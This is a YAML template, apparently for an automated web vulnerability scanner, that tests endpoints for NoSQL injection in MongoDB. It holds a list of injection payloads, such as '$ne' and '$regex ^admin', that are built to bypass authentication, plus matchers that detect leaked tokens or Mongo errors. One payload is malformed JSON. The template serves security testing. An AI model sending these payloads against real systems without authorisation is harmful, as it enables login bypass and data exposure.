id: generic-nosqli
info:
  name: NoSQL Injection
  description: Tests for NoSQL injection in MongoDB and similar NoSQL databases
  owasp_category: A03:2021
  severity: high
  tags:
    - nosql
    - injection
    - mongodb
    - generic

generic:
  endpoint: "{{all_discovered}}"
  methods: [GET, POST]
  parameter: "{{input_param}}"

  payloads:
    - '{"$ne": null}'
    - '{"$gt": ""}'
    - '{"$regex": ".*"}'
    - '{"$where": "1==1"}'
    - '{"$ne": 1}'
    - '{"$in": ["1"]}'
    - '{"$exists": true}'
    - '{"$or": [{"1":"1"},{"":"":""}]}'
    - '{"$regex": "^admin"}'
    - '{"$ne": null, "$exists": true}'
    - '{$ne:null}'
    - '$ne'
    - '$where'

  matchers:
    - type: status
      condition: in
      status:
        - 200
        - 201
    - type: regex
      part: body
      condition: or
      regex:
        - 'authenticated.*true'
        - 'success.*true'
        - '"token":\s*"[A-Za-z0-9.-_]+"'
        - '"id":\s*[0-9]+'
        - 'user.*found'
        - '"data":\s*\['
        - 'MongoError'
        - 'MongoServerError'
        - 'BSON.*Error'
        - '<title>.*TypeError.*Object'
      case_sensitive: false

  matchers_condition: or
